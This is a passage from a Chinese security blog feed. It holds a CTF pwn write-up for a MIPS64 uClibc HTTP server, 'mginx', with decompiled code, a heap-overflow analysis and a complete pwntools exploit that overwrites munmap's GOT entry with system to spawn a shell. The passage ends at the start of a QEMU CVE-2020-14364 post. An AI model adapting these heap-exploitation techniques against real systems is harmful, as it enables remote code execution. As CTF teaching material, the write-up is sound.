<span class="keyword">else</span> &#123;</span><br><span class="line">      uStack1152 = <span class="number">0</span>;</span><br><span class="line">      uStack1148 = <span class="number">0</span>;</span><br><span class="line">      bVar1 = <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">memset</span>(acStack96,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(idx_buf,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">      <span class="keyword">while</span> ((((*(ushort *)(__ctype_b + (longlong)arg3[(<span class="keyword">int</span>)uStack1148] * <span class="number">2</span>) &amp; <span class="number">0x20</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">              (uStack1152 &lt; <span class="number">9</span>)) &amp;&amp; ((uStack1152 &lt; <span class="number">9</span> &amp;&amp; (__n = <span class="built_in">strlen</span>(arg3), uStack1148 &lt; __n))))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bVar1) &#123;</span><br><span class="line">          idx_buf[(<span class="keyword">int</span>)uStack1152] = arg3[(<span class="keyword">int</span>)uStack1148];</span><br><span class="line">          uStack1152 = uStack1152 + <span class="number">1</span>;</span><br><span class="line">          uStack1148 = uStack1148 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (arg3[(<span class="keyword">int</span>)uStack1148] == <span class="string">'='</span>) &#123;</span><br><span class="line">            acStack96[(<span class="keyword">int</span>)uStack1152] = <span class="string">'\0'</span>;</span><br><span class="line">            bVar1 = <span class="literal">true</span>;</span><br><span class="line">            uStack1152 = <span class="number">0</span>;</span><br><span class="line">            uStack1148 = uStack1148 + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!bVar1) &#123;</span><br><span class="line">          acStack96[(<span class="keyword">int</span>)uStack1152] = arg3[(<span class="keyword">int</span>)uStack1148];</span><br><span class="line">          uStack1152 = uStack1152 + <span class="number">1</span>;</span><br><span class="line">          uStack1148 = uStack1148 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      idx_buf[(<span class="keyword">int</span>)uStack1152] = <span class="string">'\0'</span>;</span><br><span class="line">      idx = atoi(idx_buf);</span><br><span class="line">      <span class="keyword">if</span> ((idx &lt; <span class="number">0</span>) || (<span class="number">0xf</span> &lt; idx)) &#123;</span><br><span class="line">        bad_request();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        iVar3 = <span class="built_in">strcmp</span>(acStack96,<span class="string">"Show"</span>);</span><br><span class="line">        <span class="keyword">if</span> ((CONCAT44(extraout_v0_hi_01,iVar3) == <span class="number">0</span>) &amp;&amp; (show_time == <span class="number">0</span>)) &#123;</span><br><span class="line">          show_time = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ((*(longlong *)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>) == <span class="number">0</span>) ||</span><br><span class="line">             (*(<span class="keyword">int</span> *)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span> + <span class="number">8</span>) &lt; <span class="number">1</span>)) &#123;</span><br><span class="line">            bad_request();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            input_data = <span class="number">0x485454502f312e30</span>;</span><br><span class="line">            uStack1112 = <span class="number">0x20323030204f4b0d</span>;</span><br><span class="line">            sz_buf = sz_buf &amp; <span class="number">0xffffffffffff</span> | <span class="number">0xa00000000000000</span>;</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            input_data = <span class="number">0x5365727665723a20</span>;</span><br><span class="line">            uStack1112 = <span class="number">0x5157426874747064</span>;</span><br><span class="line">            sz_buf = <span class="number">0x2f312e312e300d0a</span>;</span><br><span class="line">            cStack1096 = <span class="string">'\0'</span>;</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;input_data,<span class="string">"Connection: Keep-Alive\r\n"</span>);</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            __n = <span class="built_in">strlen</span>(*(<span class="keyword">char</span> **)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>));</span><br><span class="line">            <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;input_data,<span class="string">"Content-Length: %d\r\n"</span>,CONCAT44(extraout_v0_hi_02,__n));</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;input_data,<span class="string">"Content-Type: text/html\r\n"</span>);</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            input_data._2_6_ = input_data._2_6_ &amp; <span class="number">0xffffffffff</span>;</span><br><span class="line">            input_data = CONCAT26(<span class="number">0xd0a</span>,input_data._2_6_);</span><br><span class="line">            __n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;input_data);</span><br><span class="line">            write(<span class="number">1</span>,&amp;input_data,__n);</span><br><span class="line">            __buf = *(<span class="keyword">void</span> **)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>);</span><br><span class="line">            __n = <span class="built_in">strlen</span>(*(<span class="keyword">char</span> **)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>));</span><br><span class="line">            write(<span class="number">1</span>,__buf,__n);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          iVar3 = <span class="built_in">strcmp</span>(acStack96,<span class="string">"Del"</span>);</span><br><span class="line">          <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_03,iVar3) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(longlong *)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">              bad_request();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>));</span><br><span class="line">              *(undefined8 *)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">              *(undefined4 *)(<span class="built_in">list</span> + (longlong)idx * <span class="number">0x10</span> + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">              success();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            bad_request();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    idx = strcasecmp(arg2,<span class="string">"POST"</span>);</span><br><span class="line">    <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_04,idx) == <span class="number">0</span>) &#123;</span><br><span class="line">      post_data = get_line(&amp;input_data,<span class="number">0x400</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="number">0</span> &lt; post_data &amp;&amp;</span><br><span class="line">             (idx = <span class="built_in">strcmp</span>(<span class="string">"\n"</span>,(<span class="keyword">char</span> *)&amp;input_data), CONCAT44(extraout_v0_hi_07,idx) != <span class="number">0</span>))) &#123;</span><br><span class="line">        uStack1112 = uStack1112 &amp; <span class="number">0xffffffffffffff00</span>;</span><br><span class="line">        idx = strcasecmp((<span class="keyword">char</span> *)&amp;input_data,<span class="string">"Content-Length:"</span>);</span><br><span class="line">        <span class="keyword">if</span> ((CONCAT44(extraout_v0_hi_05,idx) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">           (new_sz = atoi((<span class="keyword">char</span> *)&amp;sz_buf), (<span class="keyword">int</span>)new_sz &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* vuln here */</span></span><br><span class="line">          error_request(&amp;sz_buf,post_data + <span class="number">-0x11</span>);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = strcasecmp((<span class="keyword">char</span> *)&amp;input_data,<span class="string">"Content-Indexx:"</span>);</span><br><span class="line">        <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_06,idx) == <span class="number">0</span>) &#123;</span><br><span class="line">          iStack1136 = atoi((<span class="keyword">char</span> *)&amp;sz_buf);</span><br><span class="line">        &#125;</span><br><span class="line">        post_data = get_line(&amp;input_data,<span class="number">0x400</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">int</span>)new_sz &lt; <span class="number">0</span>) || (<span class="number">0x140</span> &lt; (<span class="keyword">int</span>)new_sz)) || (iStack1136 &lt; <span class="number">0</span>)) || (<span class="number">0xf</span> &lt; iStack1136))</span><br><span class="line">      &#123;</span><br><span class="line">        bad_request();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(longlong *)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="number">0x250</span>);</span><br><span class="line">          __buf = <span class="built_in">malloc</span>(new_sz);</span><br><span class="line">          *(<span class="keyword">void</span> **)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>) = __buf;</span><br><span class="line">          *(<span class="keyword">size_t</span> *)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span> + <span class="number">8</span>) = new_sz;</span><br><span class="line">          uStack1152 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack1152 &lt; (<span class="keyword">int</span>)new_sz) &#123;</span><br><span class="line">            read(<span class="number">0</span>,tmp + (<span class="keyword">int</span>)uStack1152,<span class="number">1</span>);</span><br><span class="line">            uStack1152 = uStack1152 + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (*tmp != <span class="string">'\0'</span>) &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(*(<span class="keyword">char</span> **)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>),tmp);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="number">0x250</span>);</span><br><span class="line">          <span class="keyword">if</span> (*(<span class="keyword">int</span> *)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span> + <span class="number">8</span>) &lt; (<span class="keyword">int</span>)new_sz) &#123;</span><br><span class="line">            __buf = <span class="built_in">malloc</span>(new_sz);</span><br><span class="line">            *(<span class="keyword">void</span> **)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>) = __buf;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span> + <span class="number">8</span>) = new_sz;</span><br><span class="line">            uStack1152 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack1152 &lt; (<span class="keyword">int</span>)new_sz) &#123;</span><br><span class="line">              read(<span class="number">0</span>,tmp + (<span class="keyword">int</span>)uStack1152,<span class="number">1</span>);</span><br><span class="line">              uStack1152 = uStack1152 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (*tmp != <span class="string">'\0'</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(*(<span class="keyword">char</span> **)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>),tmp);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span> + <span class="number">8</span>) = new_sz;</span><br><span class="line">            uStack1152 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">int</span>)uStack1152 &lt; (<span class="keyword">int</span>)new_sz) &#123;</span><br><span class="line">              read(<span class="number">0</span>,tmp + (<span class="keyword">int</span>)uStack1152,<span class="number">1</span>);</span><br><span class="line">              uStack1152 = uStack1152 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (*tmp != <span class="string">'\0'</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(*(<span class="keyword">char</span> **)(<span class="built_in">list</span> + (longlong)iStack1136 * <span class="number">0x10</span>),tmp);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        success();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了洞之后需要考虑uClibc的堆分配机制。通过查看libc中的一些字符串，对比源码文件的<code>malloc-simple/malloc.c</code>、<code>malloc-standard/malloc.c</code>及<code>malloc/malloc.c</code>，可以看到使用的是<code>malloc-standard</code>，其实现和早期dlmalloc差不多，所以一些经典的攻击都可以用，这里溢出之后可以直接改fastbin的fd来实现任意地址写(这里的分配没有sz的合法性检查)。</p>
<p>泄露地址的次数只有一次，这里选择泄露libc，先溢出构造chunk overlapping，释放ub之后切割即可leak libc。注意这里的fastbin的最大值为80，即0x50。另外由于泄露的内容是由<code>strlen(buf)</code>决定的，大端架构下ub的fd是<code>0x000000xx</code>开头，因此还得拿一次溢出填充零字节再泄露。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     80</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">       If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">       */</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)) &#123;</span><br><span class="line">	fb = &amp;(av-&gt;fastbins[(fastbin_index(nb))]);</span><br><span class="line">	<span class="keyword">if</span> ( (victim = *fb) != <span class="number">0</span>) &#123;</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	    check_remalloced_chunk(victim, nb);</span><br><span class="line">	    retval = chunk2mem(victim);</span><br><span class="line">	    <span class="keyword">goto</span> DONE;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>get shell的方法和x86的方式不太一样，看源码之后发现没有<code>__malloc_hook</code>和<code>__free_hook</code>，但是libc也有类似got表的结构。这一点可以在libc中调用某个函数前看到，其调用方式较为固定，都是先使用<code>ld         t9,-0x6890(gp)</code>来load，之后再调用。而gp是一个固定的值，再调试一下即可发现这其实就类似于从got表中取函数指针的方式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.got:00000000000A9A08 sigprocmask_ptr_0:.dword sigprocmask</span><br><span class="line">.got:00000000000A9A10 free_ptr:       .dword free</span><br><span class="line">.got:00000000000A9A18 program_invocation_name_ptr:.dword program_invocation_name</span><br><span class="line">.got:00000000000A9A20 _dl_pagesize_ptr:.dword _dl_pagesize     # DATA XREF: tmpnam+14↑o</span><br><span class="line">.got:00000000000A9A28 close_ptr_0:    .dword close</span><br><span class="line">.got:00000000000A9A30 tcsetattr_ptr_0:.dword tcsetattr         # DATA XREF: logbf+10↑o</span><br><span class="line">.got:00000000000A9A38 sched_yield_ptr:.dword sched_yield</span><br><span class="line">.got:00000000000A9A40 fcntl_ptr_0:    .dword fcntl</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0015d7d8 df 85 98 f8     ld         a1=&gt;pthread_mutex_unlock,-0x6708(gp)=&gt;-&gt;pthrea   = 001829b4</span><br><span class="line">0015d7dc df 99 97 70     ld         t9,-0x6890(gp)=&gt;-&gt;_pthread_cleanup_push_defer    = 00187bf0</span><br><span class="line">0015d7e0 ff b1 00 28     sd         s1,local_18(sp)</span><br><span class="line">0015d7e4 00 80 88 25     or         s1,__ptr,zero</span><br><span class="line">0015d7e8 03 a0 20 25     or         __ptr,sp,zero</span><br><span class="line">0015d7ec ff bf 00 38     sd         ra,local_8(sp)</span><br><span class="line">0015d7f0 03 20 f8 09     jalr       t9=&gt;_pthread_cleanup_push_defer                  undefined _pthread_cleanup_push_</span><br><span class="line">0015d7f4 ff b0 00 20     _sd        s0,local_20(sp)</span><br></pre></td></tr></table></figure>
<p>因此最后的利用思路是覆写libc中的某个got表，首先排除free，因为binary中的free@got已经写入了free@libc，因此修改也没有用，我们只能改libc内部会调用的函数。</p>
<p>查看源码之后发现我们可以控制<code>munmap@got</code>为<code>system</code>，而后将<code>prev_size</code>改为<code>-0x10</code>，从而使其free的对象指向data数据，而这里被赋值为<code>/bin/sh\x00</code>，最终Get shell。</p>
<p>有一些检查需要绕过，一是munmap的chunk的sz要大于0x53;二是需要设置IS_MAPPED位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">  <span class="comment">//..</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If the chunk was allocated via mmap, release via munmap()</span></span><br><span class="line"><span class="comment">       Note that if HAVE_MMAP is false but chunk_is_mmapped is</span></span><br><span class="line"><span class="comment">       true, then user must have overwritten memory. There's nothing</span></span><br><span class="line"><span class="comment">       we can do to catch this error unless DEBUG is set, in which case</span></span><br><span class="line"><span class="comment">       check_inuse_chunk (above) will have triggered error.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">size_t</span> offset = p-&gt;prev_size;</span><br><span class="line">	av-&gt;n_mmaps--;</span><br><span class="line">	av-&gt;mmapped_mem -= (size + offset);</span><br><span class="line">	munmap((<span class="keyword">char</span>*)p - offset, size + offset);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="调试小技巧"><a href="#调试小技巧" class="headerlink" title="调试小技巧"></a>调试小技巧</h3><p>启动qemu之后使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space &amp; ncat -vc &quot;gdbserver 0.0.0.0:5555 /m1/httpd&quot; -kl 0.0.0.0 3333</code>关闭地址随机化并启动gdbserver，而后在gdb的断点可以下成可复用的断点，方便调试。</p>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'mips64'</span>,endian=<span class="string">'big'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libuClibc-1.0.32.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mips64-static"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/RCTF/mnginx/player"</span>, <span class="string">"./mginx"</span>])</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mips64-static"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/RCTF/mnginx/player"</span>, <span class="string">"./mginx"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">3333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx,sz,content=<span class="string">"xmzyshypnc"</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /index.html\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: "</span>+str(sz)+<span class="string">"\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Indexx: "</span>+str(idx)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    <span class="keyword">if</span> len(content) != <span class="number">0</span>:</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?"</span></span><br><span class="line">    payload += <span class="string">"Show="</span>+str(idx)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Del</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?"</span></span><br><span class="line">    payload += <span class="string">"Del="</span>+str(idx)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Req</span><span class="params">(content)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">"POST /index.html\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: "</span>+content+<span class="string">"\n"</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#list:0x14240</span></span><br><span class="line">    <span class="comment">#[0x20,0x40] [0x60,0x80] [0xa0,0xc0) [0xe0,0xff]</span></span><br><span class="line">    <span class="comment">#GET:Show/Del</span></span><br><span class="line">    <span class="comment">#payload = "GET /index.html?"</span></span><br><span class="line">    <span class="comment">#payload += "Show=1"</span></span><br><span class="line">    <span class="comment">#POST:</span></span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    Add(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    Add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    Add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    Add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    neg_val = str(<span class="number">0xffffffff</span>)</span><br><span class="line">    Req(neg_val.ljust(<span class="number">0x200</span>,<span class="string">'b'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>+<span class="number">0x50</span>+<span class="number">0x30</span>+<span class="number">1</span>))</span><br><span class="line">    Del(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">    Req(neg_val.ljust(<span class="number">0x200</span>,<span class="string">'b'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+<span class="string">'xmzyshypnc1'</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"xmzyshypnc1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"xmzyshypnc1"</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">5</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xc2d48</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    system = libc_base + <span class="number">0x65370</span></span><br><span class="line">    <span class="comment">#system = libc_base + 0x62fe0</span></span><br><span class="line">    <span class="comment">#system = libc_base + 0x1f820</span></span><br><span class="line">    <span class="comment">#free_got = libc_base + 0xa9a10</span></span><br><span class="line">    munmap_got = libc_base + <span class="number">0xA9228</span></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Del(<span class="number">4</span>)</span><br><span class="line">    Del(<span class="number">2</span>)</span><br><span class="line">    Req(neg_val.ljust(<span class="number">0x200</span>,<span class="string">'b'</span>)+p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)<span class="number">-0x10</span>)+p64(<span class="number">0x63</span>)+<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x51</span>)+<span class="string">'x'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(munmap_got<span class="number">-0x10</span><span class="number">-1</span>))</span><br><span class="line">    Add(<span class="number">6</span>,<span class="number">0x20</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'x'</span>*<span class="number">0x18</span>)</span><br><span class="line">    static_libc = <span class="number">0x000000fff7f21000</span></span><br><span class="line">    payload = p64(system)</span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">0x20</span>,payload.ljust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">9</span>,<span class="string">'a'</span>*<span class="number">4</span>+p64(system)[<span class="number">3</span>:])</span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">3</span>)</span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#triger</span></span><br><span class="line">    Del(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/14/mips-pwn/11.png" alt></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ruan777.github.io/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">ruan-mips64调试环境搭建</a></p>
<p><a href="https://matshao.com/2020/09/04/QWB2020-Quals-mipsgame/" target="_blank" rel="noopener">matshao-[QWB2020 Quals] - mipsgame</a></p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-14364 Qemu越界读写漏洞复现与分析</title>
    <url>/2021/01/09/cve-2020-14364/</url>
    <content><![CDATA[<h1 id="CVE-2020-14364-Qemu越界读写漏洞复现与分析"><a href="#CVE-2020-14364-Qemu越界读写漏洞复现与分析" class="headerlink" title="CVE-2020-14364 Qemu越界读写漏洞复现与分析"></a>CVE-2020-14364 Qemu越界读写漏洞复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞是长亭的师傅发现的，被称为是qemu历史上最严重的漏洞，本篇文章旨在复现该漏洞，理解漏洞产生原因及利用链，最终达成逃逸，由于涉及到的东西太多，不能和以前一样把所有东西都弄好再总结成博客，打算边做边记录，康康这样对整理思路是不是更好一点。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在虚拟机中连了一个真实的USB2.0设备，并且根据这篇文章<a href="https://xz.aliyun.com/t/8320" target="_blank" rel="noopener">CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路</a>制造了一个.img文件模拟USB的文件系统，启动脚本如下：</p>
